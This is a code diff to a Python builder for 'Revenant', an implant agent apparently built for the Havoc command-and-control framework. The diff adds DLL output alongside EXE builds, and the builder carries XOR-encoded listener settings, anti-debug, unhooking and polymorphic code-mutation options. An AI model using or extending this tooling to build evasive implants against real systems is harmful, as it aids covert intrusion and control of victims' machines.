@@ -175,7 +175,7 @@ def process_strings_h():
         with open(filepath, 'w') as f:
             f.write(strings_file)
 
-def process_config_h(config: dict):
+def process_config_h(config: dict, format = 0):
     config_user_agent:         str = xor_encode(config['Options']['Listener']['UserAgent'])
     config_host_bind:          str = xor_encode(config['Options']['Listener']['HostBind'])
     config_host_port:          str = config['Options']['Listener']['PortBind']
@@ -187,7 +187,7 @@ def process_config_h(config: dict):
     config_native:             str = str(config['Config']['Native']).upper()
     config_anti_debug:         str = str(config['Config']['AntiDebug']).upper()
     config_unhook:             str = str(config['Config']['Unhooking']).upper()
-
+    config_format:             str = str(format).upper()
     header_file = f'''
 #define CONFIG_USER_AGENT {{{config_user_agent}}}
 #define CONFIG_HOST {{{config_host_bind}}}
@@ -200,6 +200,7 @@ def process_config_h(config: dict):
 #define CONFIG_NATIVE {str(config_native).upper()}
 #define CONFIG_ANTI_DEBUG {str(config_anti_debug).upper()}
 #define CONFIG_UNHOOK {str(config_unhook).upper()}
+#define CONFIG_MAKE {str(config_format).upper()}
     '''
 
     for filepath in glob.iglob('**/Config.h', recursive=True):
@@ -333,7 +334,7 @@ class Revenant(AgentType):
         self.Arch: list = ["64", "86"]
         self.Formats: list = [
             {"Name": "Windows Exe", "Extension": "exe"},
-            #{"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
+            {"Name": "Windows DLL", "Extension": "dll"}
         ]
         self.BuildingConfig: dict = {
             "Sleep": "10",
@@ -375,7 +376,11 @@ class Revenant(AgentType):
             print("[*] Configuring String.h header...")
 
         if config['Options']['Arch'] == "64":
-            compile_command: str = "cmake -DARCH=\"x64\" . && cmake --build . -j 1"
+            if(self.Formats[0]["Extension"] == "exe"):
+                compile_command: str = "cmake -DARCH=\"x64\" . && cmake --build . -j 1"
+            elif(self.Formats[0]["Extension"] == "dll"):
+                compile_command: str = "cmake -DARCH=\"x64\" -DMAKE=\"DLL\" . && cmake --build . -j 1"
+
             for attempt in range(10): # there's a likelihood that the polymorphic will break the code, retry 10 times
                 if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x64, eula, False)
@@ -404,10 +409,18 @@ class Revenant(AgentType):
                 if attempt >= 9:
                     print("[*] !! ERROR - MAX ATTEMPTS!!")
                     return
-            data = open("Agent/Bin/x64/Revenant.exe", "rb").read()
+            if(self.Formats[0]["Extension"] == "exe"):
+                data = open("Agent/Bin/x64/Revenant.exe", "rb").read()
+            elif(self.Formats[0]["Extension"] == "dll"):
+                data = open("Agent/Bin/x64/libRevenant.dll", "rb").read()
 
         elif config['Options']['Arch'] == "86":
-            compile_command: str = "cmake -DARCH=\"x86\" . && cmake --build . -j 1"
+
+            if(self.Formats[0]["Extension"] == "exe"):
+                compile_command: str = "cmake -DARCH=\"x86\" . && cmake --build . -j 1"
+            elif(self.Formats[0]["Extension"] == "dll"):
+                compile_command: str = "cmake -DARCH=\"x86\" -DMAKE=\"DLL\" . && cmake --build . -j 1"
+
             for attempt in range(10): # there's a likelihood that the polymorphic will break the code, retry 10 times
                 if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x86, eula, False)
@@ -437,8 +450,10 @@ class Revenant(AgentType):
                 if attempt >= 9:
                     print("[*] !! ERROR - MAX ATTEMPTS!!")
                     return
-
-            data = open("Agent/Bin/x86/Revenant.exe", "rb").read()
+            if(self.Formats[0]["Extension"] == "exe"):
+                data = open("Agent/Bin/x86/Revenant.exe", "rb").read()
+            elif(self.Formats[0]["Extension"] == "dll"):
+                data = open("Agent/Bin/x86/libRevenant.dll", "rb").read()
 
         # Below line sends the build executable back to Havoc for file management - 0xtriboulet
         self.builder_send_payload(config['ClientID'], self.Name +"_x"+config['Options']['Arch']+ "." + self.Formats[0]["Extension"], data)
